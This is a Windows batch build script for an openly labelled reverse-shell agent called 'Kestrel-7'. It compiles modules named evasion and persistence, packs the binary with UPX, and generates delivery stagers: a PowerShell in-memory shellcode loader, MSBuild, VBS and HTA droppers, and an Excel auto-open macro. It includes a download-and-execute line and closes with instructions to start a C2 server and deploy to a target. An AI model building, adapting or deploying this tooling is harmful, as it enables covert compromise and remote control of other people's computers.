@echo off
REM build.bat - Full compilation for Windows 11 x64
REM Run as Administrator for persistence features
REM Requires: Visual Studio 2022 Build Tools

setlocal enabledelayedexpansion

echo ============================================
echo   Kestrel-7 Reverse Shell Build System
echo   Target: Windows 11 x64 (23H2+)
echo ============================================
echo.

REM Check for VS environment
set VSCMD_VER=14.36.32532
if not defined DevEnvDir (
    echo [!] Visual Studio environment not found
    echo [*] Trying to locate VS 2022...
    
    if exist "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" (
        call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
    ) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat" (
        call "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat"
    ) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat" (
        call "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
    ) else if exist "C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat" (
        call "C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
    ) else (
        echo [ERROR] Visual Studio 2019/2022 not found
        echo [*] Please install Visual Studio Build Tools
        pause
        exit /b 1
    )
)

echo [*] Visual Studio environment: %DevEnvDir%
echo.

REM Create output directories
if not exist bin mkdir bin
if not exist bin\obj mkdir bin\obj
if not exist payloads mkdir payloads

REM Compiler flags
set CFLAGS=/EHsc /MT /O2 /GS- /DNDEBUG /FI"src/core/base.h"
set LFLAGS=/link ws2_32.lib winhttp.lib advapi32.lib wbemuuid.lib psapi.lib user32.lib /NXCOMPAT /DYNAMICBASE /OPT:REF /OPT:ICF

echo [1/5] Compiling main.cpp...
cl.exe /c %CFLAGS% src/main.cpp /Fobin\obj\main.obj
if errorlevel 1 goto error

echo [2/5] Compiling crypto.cpp...
cl.exe /c %CFLAGS% src/crypto.cpp /Fobin\obj\crypto.obj
if errorlevel 1 goto error

echo [3/5] Compiling network.cpp...
cl.exe /c %CFLAGS% src/network.cpp /Fobin\obj\network.obj
if errorlevel 1 goto error

echo [4/5] Compiling evasion.cpp...
cl.exe /c %CFLAGS% src/evasion.cpp /Fobin\obj\evasion.obj
if errorlevel 1 goto error

echo [5/5] Compiling persistence.cpp...
cl.exe /c %CFLAGS% src/persistence.cpp /Fobin\obj\persistence.obj
if errorlevel 1 goto error

echo [6/6] Compiling utils.cpp...
cl.exe /c %CFLAGS% src/utils.cpp /Fobin\obj\utils.obj
if errorlevel 1 goto error

echo.
echo [*] Linking...
cl.exe bin\obj\*.obj %LFLAGS% /OUT:bin\kestrel7_agent.exe

if errorlevel 1 goto error

REM Strip debug information
echo [*] Stripping debug symbols...
dumpbin /remove:debug bin\kestrel7_agent.exe > nul 2>&1

REM UPX compression (if available)
if exist "upx.exe" (
    echo [*] Compressing with UPX...
    upx --ultra-brute --lzma bin\kestrel7_agent.exe
) else (
    echo [!] UPX not found - skipping compression
)

echo.
echo [SUCCESS] Agent built: bin\kestrel7_agent.exe
for %%A in (bin\kestrel7_agent.exe) do echo [*] Size: %%~zA bytes

REM Generate stagers
echo.
echo [*] Generating stagers...

REM PowerShell stager
echo [*] Generating PowerShell stager...
powershell -exec bypass -Command "
    $bytes = [IO.File]::ReadAllBytes('bin\kestrel7_agent.exe');
    $b64 = [Convert]::ToBase64String($bytes);
    $stager = @'
# PowerShell Stager for Kestrel-7
# Usage: powershell -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://IP/stager.ps1')\"

`$payload = [Convert]::FromBase64String('$b64');
`$key = [System.Text.Encoding]::UTF8.GetBytes('Kestrel7_Win11_RevShell_2026');
`$aes = New-Object System.Security.Cryptography.AesManaged;
`$aes.Key = `$key;
`$aes.IV = @(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
`$decryptor = `$aes.CreateDecryptor();
`$shellcode = `$decryptor.TransformFinalBlock(`$payload, 0, `$payload.Length);
`$decryptor.Dispose(); `$aes.Dispose();

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport(\"kernel32.dll\")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport(\"kernel32.dll\")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport(\"kernel32.dll\")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    [DllImport(\"kernel32.dll\")]
    public static extern bool CloseHandle(IntPtr hObject);
    [DllImport(\"kernel32.dll\")]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
}
'@

`$mem = [Win32]::VirtualAlloc([IntPtr]::Zero, `$shellcode.Length, 0x3000, 0x40);
[System.Runtime.InteropServices.Marshal]::Copy(`$shellcode, 0, `$mem, `$shellcode.Length);
`$thread = [Win32]::CreateThread([IntPtr]::Zero, 0, `$mem, [IntPtr]::Zero, 0, [IntPtr]::Zero);
if (`$thread -ne [IntPtr]::Zero) {
    [Win32]::WaitForSingleObject(`$thread, 0xFFFFFFFF);
    [Win32]::CloseHandle(`$thread);
}
[Win32]::VirtualFree(`$mem, 0, 0x8000);
'@ -replace 'BASE64_ENCODED_SHELLCODE_HERE', $b64
    $stager | Out-File payloads\stager.ps1 -Encoding ASCII
"

echo [*] Generating MSBuild stager...
powershell -exec bypass -Command "
    $bytes = [IO.File]::ReadAllBytes('bin\kestrel7_agent.exe');
    $b64 = [Convert]::ToBase64String($bytes);
    $xml = Get-Content payloads\msbuild_stager.xml -Raw
    $xml = $xml -replace 'BASE64_ENCODED_PAYLOAD_HERE', $b64
    $xml | Out-File payloads\msbuild_stager_final.xml -Encoding ASCII
"

echo [*] Generating VBS stager...
powershell -exec bypass -Command "
    $bytes = [IO.File]::ReadAllBytes('bin\kestrel7_agent.exe');
    $b64 = [Convert]::ToBase64String($bytes);
    $vbs = Get-Content payloads\wmi_stager.vbs -Raw
    $vbs = $vbs -replace 'BASE64_ENCODED_PAYLOAD_HERE', $b64
    $vbs | Out-File payloads\wmi_stager_final.vbs -Encoding ASCII
"

echo [*] Generating HTA stager...
powershell -exec bypass -Command "
    $bytes = [IO.File]::ReadAllBytes('bin\kestrel7_agent.exe');
    $b64 = [Convert]::ToBase64String($bytes);
    @'
<!DOCTYPE html>
<html>
<head>
<meta http-equiv=\"X-UA-Compatible\" content=\"IE=9\">
<script language=\"VBScript\">
    Dim shell
    Set shell = CreateObject(\"WScript.Shell\")
    shell.Run \"powershell -exec bypass -c `\"`$payload = [Convert]::FromBase64String('$b64'); ...`\"\", 0, False
</script>
</head>
<body>
Loading...
</body>
</html>
'@ | Out-File payloads\stager.hta -Encoding ASCII
"

echo [*] Generating Excel macro...
powershell -exec bypass -Command "
    $bytes = [IO.File]::ReadAllBytes('bin\kestrel7_agent.exe');
    $b64 = [Convert]::ToBase64String($bytes);
    @'
Sub Auto_Open()
    Dim shell As Object
    Set shell = CreateObject(\"WScript.Shell\")
    shell.Run \"powershell -exec bypass -c `\"`$payload = [Convert]::FromBase64String('$b64'); ...`\"\", 0, False
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
'@ | Out-File payloads\macro_stager.vba -Encoding ASCII
"

echo.
echo ============================================
echo   BUILD COMPLETE
echo ============================================
echo.
echo [*] Files generated:
echo     - bin\kestrel7_agent.exe
echo     - payloads\stager.ps1
echo     - payloads\msbuild_stager_final.xml
echo     - payloads\wmi_stager_final.vbs
echo     - payloads\stager.hta
echo     - payloads\macro_stager.vba
echo.
echo [*] Next steps:
echo     1. Start C2 server: cd server && python3 c2_server.py
echo     2. Deploy stager to target
echo     3. Use C2 console to send commands
echo.

goto end

:error
echo.
echo [ERROR] Build failed with error code %errorlevel%
echo [*] Please check compiler output above
pause
exit /b 1

:end
pause
